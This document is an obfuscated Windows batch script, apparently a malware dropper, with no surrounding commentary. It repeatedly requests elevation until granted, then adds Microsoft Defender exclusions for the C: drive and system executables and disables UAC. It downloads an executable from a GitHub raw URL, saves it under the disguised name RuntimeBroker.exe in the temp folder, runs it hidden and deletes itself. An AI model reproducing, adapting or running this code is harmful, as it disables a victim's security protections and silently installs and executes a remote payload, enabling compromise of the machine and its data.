@echo off & setlocal enableDelayedExpansion
set "ghISc=NET" & set "PNW=SESSION" & set "kGtwl=2>&1" & set "MHCOi=>nul"
%ghISc% %PNW% %MHCOi% %kGtwl%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "MdxVB=foo" & set "lSCvv=qux" & set "yae=baz" & set "xOEJz=bar" & rem zqWXbB LeN eFfEqvn
set "JUHXW=powershell -ExecutionPolicy Bypass -Command"
set "kOu=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "Okw='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "jUej='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!JUHXW! "!kOu! !Okw! !jUej!" %MHCOi% %kGtwl%
set "XPKRO=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "QYl=-Name 'EnableLUA' -Value 0"
!JUHXW! "!XPKRO! !QYl!" %MHCOi% %kGtwl%
set "iMXK=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!JUHXW! "!iMXK!" %MHCOi% %kGtwl%
if !errorlevel! neq 0 (goto %a%)
set "cLRs=timeout /t" & !cLRs! 2 %MHCOi% %kGtwl%
set "XuV=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "CCC=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "kBKsh=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!JUHXW! "!XuV! !CCC! !kBKsh!" %MHCOi% %kGtwl%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!cLRs! 1 %MHCOi% %kGtwl% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %MHCOi% %kGtwl%
del /f /q "%~f0" %MHCOi% %kGtwl%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %MHCOi% %kGtwl%
if !errorlevel! neq 0 (!cLRs! 3 %MHCOi% %kGtwl% & goto %b%)
exit /b
